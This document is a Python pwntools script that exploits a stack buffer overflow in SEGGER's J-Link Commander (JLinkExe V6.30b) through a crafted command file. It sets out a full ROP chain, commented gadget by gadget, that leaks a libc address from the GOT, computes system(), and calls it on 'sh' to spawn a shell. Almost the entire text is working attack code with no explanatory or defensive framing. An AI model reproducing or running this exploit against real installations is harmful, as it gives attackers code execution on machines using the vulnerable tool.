from pwn import *
file_name = '/home/uzer/pwnit.txt'
bin_name = '/home/uzer/JLink_Linux_V630b_i386/JLinkExe'

context.arch = 'i386'
context.binary = bin_name
context.local(log_level='debug')
context.os = 'linux'
context.terminal = ['termite', '-e']

elf = ELF(bin_name)

'''
//Chain psudo
0x804ae7c: pop esi; pop edi; pop ebp; ret; //esi = **libc
0x0804ae79: mov eax, esi; pop ebx; pop esi; pop edi; pop ebp; ret; //eax = esi, esi = **libc
0x0804d0b3: add eax, dword ptr [eax]; add byte ptr [ebx + 0x5e], bl; pop edi; pop ebp; ret;  //eax += *eax
0x8048e87: sub eax, esi; pop esi; pop edi; pop ebp; ret; //eax -= esi
0x0804b193: add eax, 0x5b000000; pop esi; pop edi; pop ebp; ret; //eax += 0x5b000000, esi = 0x5b000000-off_to_sys
0x8048e87: sub eax, esi; pop esi; pop edi; pop ebp; ret; //eax -= esi
0x08049841: push esi; call eax;
'''
rop = ROP(elf, badchars='\x00\x0a\x0d')
rop.call(0x804ae7c)
rop.raw(elf.got.__libc_start_main)
rop.raw(0xaaaaaaaa)
rop.raw(0xaaaaaaaa)
rop.call(0x0804ae79)
rop.raw(0x08088069) #rand writeable text mem
rop.raw(elf.got.__libc_start_main)
rop.raw(0xaaaaaaaa)
rop.raw(0xaaaaaaaa)
rop.call(0x0804d0b3)
rop.raw(0xaaaaaaaa)
rop.raw(0xaaaaaaaa)
rop.call(0x8048e87)
rop.raw(0xaaaaaaaa)
rop.raw(0xaaaaaaaa)
rop.raw(0xaaaaaaaa)
rop.call(0x0804b193)
rop.raw(0x5b000000-0x24130) #system
rop.raw(0xaaaaaaaa)
rop.raw(0xaaaaaaaa)
rop.call(0x8048e87)
rop.raw(next(elf.search('SWOFlush'))+0x6) #'sh\x00'
rop.raw(0xbbbbbbbb)
rop.raw(0x08088069) #rand writeable text mem
rop.call(0x08049841) #push esi, call eax
rop.raw(0x08088069) #rand writeable text mem
rop.raw(0xccccccc1)
rop.exit()
print rop.dump()

f = open(file_name, 'wb')
f.write(b'A'*541)
f.write(str(rop))
f.close()

io = process([bin_name, '-CommandFile', file_name])
io.interactive()
